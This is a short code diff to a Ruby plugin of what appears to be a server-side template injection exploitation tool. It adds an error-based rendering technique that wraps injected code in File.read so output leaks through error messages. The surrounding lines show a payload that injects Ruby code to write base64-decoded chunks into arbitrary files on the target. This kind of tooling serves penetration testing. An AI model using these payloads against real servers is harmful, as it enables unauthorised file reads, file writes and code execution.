@@ -23,6 +23,13 @@ class Ruby(Plugin):
                 'test_render': f"""({rand.randints[0]}*{rand.randints[1]}).to_s""",
                 'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
             },
+            'render_error': {
+                'render': '{code}',
+                'header': """File.read(({header[0]}+{header[1]}).to_s+""",
+                'trailer': """+({trailer[0]}+{trailer[1]}).to_s)""",
+                'test_render': f"""({rand.randints[0]}*{rand.randints[1]}).to_s""",
+                'test_render_expected': f'{rand.randints[0]*rand.randints[1]}'
+            },
             'write': {
                 'call': 'inject',
                 'write': """require'base64';File.open('{path}', 'ab+') {{|f| f.write(Base64.urlsafe_decode64('{chunk_b64}')) }}""",
